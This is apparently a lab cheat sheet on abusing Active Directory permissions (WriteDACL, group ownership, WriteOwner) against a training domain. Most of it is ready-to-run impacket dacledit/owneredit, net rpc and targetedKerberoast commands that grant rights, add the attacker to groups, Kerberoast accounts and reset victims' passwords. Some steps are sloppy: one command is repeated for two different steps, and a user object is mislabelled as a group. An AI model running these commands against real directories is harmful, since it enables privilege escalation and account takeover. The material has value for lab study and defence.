This guide shows how to exploit the "Write-DACL" permission that a user might have over example another Group, this allows us to change the DACL and add ourselfs to the group itself!


## How do identify?
You can either check on Bloodhound all the nodes where you see "WriteDacl" from you current user.
Or you can check via impacketer.
```shell-session
python3 examples/dacledit.py -principal Lilia -target "Finance Managers" -dc-ip 10.129.80.58 inlanefreight.local/Lilia:DACLPass123
```


## WriteDACL over Group?
You must first write the DACL that will allow our user to add him/herself to the target group.
```shell-session
python3 examples/dacledit.py -action 'write' -rights 'WriteMembers' -principal 'Lilia' -target-dn 'CN=FINANCE MANAGERS,CN=USERS,DC=INLANEFREIGHT,DC=LOCAL
' INLANEFREIGHT.LOCAL/LILIA:'DACLPass123' -dc-ip 10.129.80.58
```
Now if everything went smooth, we can add our self to the group.
```shell-session
net rpc group addmem "Finance Managers" "Lilia" -U INLANEFREIGHT.LOCAL/LILIA%'DACLPass123' -S "10.129.80.58"
```


## WriteDACL over User?
We must first write the "FullControll" over the targeted user.
```shell-session
python3 examples/dacledit.py -action 'write' -rights 'FullControl' -principal 'Lilia' -target 'Kendra' INLANEFREIGHT.LOCAL/LILIA:'DACLPass123' -dc-ip 10.129.80.58
```
Next we should be able to add a "fake" SPN so we can perform a Kerberoast attack.
```shell-session
python3 targetedKerberoast.py -vv -d inlanefreight.local -u Lilia -p DACLPass123 --request-user Kendra --dc-ip 10.129.80.58
```
Lastly we need to add a dummy password so we can grab the TGT.
```shell-session
python3 targetedKerberoast.py -vv -d inlanefreight.local -u Lilia -p DACLPass123 --request-user Kendra --dc-ip 10.129.80.58
```
Alternatively we should be able to reset victims password as we have full access over the victim's account.
```shell-session
net rpc password Kendra 'Coglione1!' -U inlanefreight.local/Lilia%'DACLPass123' -S 10.129.80.58
```


## Owner over a Group
If you user "Owns" a group then you can write the DACLs so you can basically do whatever you want over that group. 
We can write a DACL that allows our user to add him/herself to it.
```shell-session
python3 examples/dacledit.py -action 'write' -rights 'WriteMembers' -principal 'Lilia' -target 'Managers' INLANEFREIGHT.LOCAL/LILIA:'DACLPass123' -dc-ip 10.129.80.58
```
And consequently add yourself to it.
```shell-session
net rpc group addmem "Managers" "Kendra" -U INLANEFREIGHT.LOCAL/LILIA%"DACLPass123" -S "10.129.80.58"
```


## WriteOwner over a Object
If you find yourself being part of a group or directly having permission to write the owner of a AD object(example a user) then you can write yourself as owner of that object.
```shell-session
python3 examples/owneredit.py -action write -new-owner 'Kendra' -target 'Chap' INLANEFREIGHT.LOCAL/KENDRA:'Coglione1!' -dc-ip 10.129.80.58
```
Now that we are owner of the target group we need write the DACL to add a "FullControll" over the User object.
```shell-session
python3 examples/dacledit.py -action 'write' -rights 'FullControl' -principal 'Kendra' -target 'Chap' INLANEFREIGHT.LOCAL/KENDRA:'Coglione1!' -dc-ip 10.129.80.58
```
Alternatively we can also reset the user password.